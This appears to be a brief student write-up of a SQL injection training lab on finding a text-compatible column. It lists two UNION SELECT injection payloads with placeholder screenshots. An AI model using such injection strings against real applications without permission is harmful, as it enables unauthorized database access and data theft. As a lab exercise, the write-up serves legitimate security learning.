SQL injection UNION attack, finding a column containing text \
Goal -  The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. \
<img width="1919" height="930" alt="image" src="https://github.com/user-attachments/assets/d8011d64-5c79-48c1-81c6-21ce71f91162" /> \
What we know - 3 columns \
Step 1  \
try \
' UNION SELECT 'DWUQky',NULL,NULL -- \
<img width="1612" height="930" alt="image" src="https://github.com/user-attachments/assets/2f002136-5119-4198-903f-93aafc32fc77" /> \
Step 2  \
Try \ 
' UNION SELECT NULL,'DWUQky',NULL -- \
<img width="1598" height="900" alt="image" src="https://github.com/user-attachments/assets/053269d6-08f7-4c30-89cb-bbae46d6edb2" /> \
THATS IT \
<img width="1823" height="929" alt="image" src="https://github.com/user-attachments/assets/e4bdf2a4-2056-481f-8313-4ea50fd6593a" />


